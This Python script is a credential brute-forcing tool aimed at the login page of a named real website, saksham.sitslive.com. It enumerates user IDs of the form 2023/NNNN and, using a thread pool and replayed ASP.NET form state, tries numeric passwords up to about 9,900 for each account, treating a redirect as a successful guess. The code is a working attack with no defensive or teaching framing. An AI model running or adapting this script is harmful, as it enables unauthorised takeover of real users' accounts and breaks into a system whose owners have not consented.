import requests

from script.http_scripts import *
import logging
import time

# logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
# log = logging.getLogger('test')
#
#


def new_attempt_login(username, password, session):
    url = 'https://saksham.sitslive.com/login'

    headers = {
        "accept": "*/*",
        "accept-language": "en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7",
        "cache-control": "no-cache",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "cookie": "ASP.NET_SessionId=w3xnaxbvl5d3j4gdz3xtlnf3",
        "origin": "https://saksham.sitslive.com",
        "priority": "u=1, i",
        "referer": "https://saksham.sitslive.com/login",
        "sec-ch-ua": "\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "x-microsoftajax": "Delta=true",
        "x-requested-with": "XMLHttpRequest"
    }

    payload = {
        "data-daw": "ScriptManager1=updatepanel%7CbtnLogin&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=GXq8WYlFoIyiG3kHh%2FyWm36EVSPnNg9oMUi9wBqeXZ5oLCwDaEF1fWGlZu6NIZKEGzs%2FZqM8kQDJ35ynh50OxuDTdeqaTh4wZe5gn2NIsPG1M9Ds%2BzDSx0hHu317Lrbw&__VIEWSTATEGENERATOR=C2EE9ABB&__EVENTVALIDATION=k9EujBZLYjXQ6rTY4Kfb27V%2FFrBy8Ba23xg9ZaR9inInhEHhMnDnorNbGIO4S1IWOPs2u1aAPCkn5ieUxwSc0CgIlxhouE9FPckXsb%2F078IUjLS6AJvoaw3K%2F%2BAABCmEBzF1Ae469WWe4mDfDZPlJyLwg8Y3lH9jol6vnwidKeaSu%2FewI8Hnv04%2BBd2lhQqFFWErXV4tmCmIKvRSer%2FfDZ1HHrJ3Vk%2FQdhUnj8JX2LHHfAeU5ALRWJxbSolA%2FDYVhU8PM7E3jQd1FBYJtVrqHwAgbSxV%2B6dPvyEDYjFbaiHkiz84m5JxTVPK53KMH%2Bpa&txtLoginID=" + username + "&txtPassword=" + password + "&ddlType=0&txtUserName=&__ASYNCPOST=true&btnLogin=Login",
    }

    response = session.post(url, headers=headers, data=json.dumps(payload))

    if "pageRedirect" in response.text:
        return password

    else:
        return None


def new_brute_force(user_id: str, start_from: int, batch_size: int = 100, threads: int = 10):
    session = requests.Session()

    p = start_from
    q = start_from + batch_size
    muserId = user_id.replace("/", "%2F")
    pool = ThreadPoolExecutor(threads)

    while True:
        futures = []

        for i in range(p, q):
            future = pool.submit(new_attempt_login, muserId, str(i), session)
            futures.append(future)

        for f in futures:
            if f.result() is not None:
                return f.result()

        if p > 9800:
            return None

        p += batch_size
        q += batch_size


def main():
    for i in range(2000, 2200):
        formatted = '{0:04}'.format(i)
        userid = "2023/" + formatted
        existence = checkUserExistence(userid)
        print(f"Checking for user: {userid}: "+str(existence))


